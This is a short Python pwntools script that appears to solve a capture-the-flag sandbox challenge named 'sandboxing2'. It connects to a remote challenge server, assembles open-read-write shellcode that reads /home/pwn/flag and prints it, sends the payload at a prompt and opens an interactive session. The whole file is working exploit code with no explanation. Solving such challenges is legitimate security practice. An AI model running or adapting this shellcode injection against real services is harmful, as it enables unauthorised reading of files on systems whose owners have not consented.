from pwn import *
context.clear(arch='amd64', os='linux')

context.log_level = 'debug'
p = remote("realsung.kr", 13351)
# p = process("./sandboxing1")
e = ELF("./sandboxing2")

shellcode = shellcraft.pushstr("/home/pwn/flag")
shellcode += shellcraft.open("rsp", 0, 0)
shellcode += shellcraft.read("rax", "rsp", 100)
shellcode += shellcraft.write(0, "rsp", 100)

payload = asm(shellcode)

p.sendlineafter(b"> ", payload)

p.interactive()
